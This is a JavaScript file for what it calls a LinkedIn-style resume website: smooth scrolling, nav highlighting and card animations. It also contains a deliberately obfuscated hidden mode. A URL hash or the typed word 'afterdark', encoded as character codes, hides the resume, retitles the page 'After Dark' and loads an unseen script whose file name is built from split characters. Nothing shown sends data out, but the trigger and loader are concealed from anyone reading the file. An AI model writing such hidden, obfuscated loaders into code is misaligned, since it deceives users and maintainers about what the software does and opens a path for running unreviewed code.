/* ============================================
   LinkedIn-Style Resume Website - Interactions
   ============================================ */

document.addEventListener('DOMContentLoaded', function() {
  if (_ck()) { _go(); return; }
  _wl();
  _si();
  _sa();
  _sn();
});

function _ck() {
  return location.hash === '#ad' || location.search.indexOf('ad=1') !== -1;
}

function _wl() {
  var _ = [97,102,116,101,114,100,97,114,107];
  var __ = '';
  document.addEventListener('keydown', function(e) {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
    __ += e.key.toLowerCase();
    if (__.length > _.length) __ = __.slice(-_.length);
    if (__ === _.map(function(c){return String.fromCharCode(c)}).join('')) {
      __ = '';
      _go();
    }
  });
}

function _go() {
  var _ = document.querySelector('.navbar');
  var __ = document.querySelector('.profile-header');
  var ___ = document.querySelector('.main-content');
  var ____ = document.querySelector('.footer');
  if (_) _.style.display = 'none';
  if (__) __.style.display = 'none';
  if (___) ___.style.display = 'none';
  if (____) ____.style.display = 'none';
  var _r = document.createElement('div');
  _r.id = '_x';
  _r.style.display = 'block';
  document.body.appendChild(_r);
  document.body.style.background = '#0a0a0a';
  document.title = 'After Dark';
  var _s = document.createElement('script');
  _s.src = 'js/' + ['x','9','q','3','r','z','.','j','s'].join('');
  _s.onload = function() {
    if (typeof window._xi === 'function') window._xi(_r);
  };
  document.body.appendChild(_s);
}

function _si() {
  document.querySelectorAll('.nav-link').forEach(function(link) {
    link.addEventListener('click', function(e) {
      e.preventDefault();
      var t = document.querySelector(link.getAttribute('href'));
      if (t) {
        var n = document.querySelector('.navbar').offsetHeight;
        window.scrollTo({ top: t.getBoundingClientRect().top + window.pageYOffset - n - 16, behavior: 'smooth' });
      }
    });
  });
}

function _sa() {
  var _a = document.querySelectorAll('section[id]');
  var _b = document.querySelectorAll('.nav-link');
  var _c = document.querySelector('.navbar');
  function _u() {
    var _p = window.scrollY + _c.offsetHeight + 50;
    var _cs = '';
    _a.forEach(function(s) { if (s.offsetTop <= _p) _cs = s.getAttribute('id'); });
    _b.forEach(function(l) {
      l.classList.remove('active');
      if (l.getAttribute('href') === '#' + _cs) l.classList.add('active');
    });
  }
  var _t = false;
  window.addEventListener('scroll', function() {
    if (!_t) {
      requestAnimationFrame(function() { _u(); _t = false; });
      _t = true;
    }
  });
  _u();
}

function _sn() {
  document.querySelectorAll('.card').forEach(function(c) {
    c.style.animation = 'none';
    c.style.opacity = '0';
    c.style.transform = 'translateY(12px)';
  });
  var _ = new IntersectionObserver(function(e) {
    e.forEach(function(e) {
      if (e.isIntersecting) {
        e.target.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
        e.target.style.opacity = '1';
        e.target.style.transform = 'translateY(0)';
        _.unobserve(e.target);
      }
    });
  }, { threshold: 0.1, rootMargin: '0px 0px -40px 0px' });
  document.querySelectorAll('.card').forEach(function(c) { _.observe(c); });
}
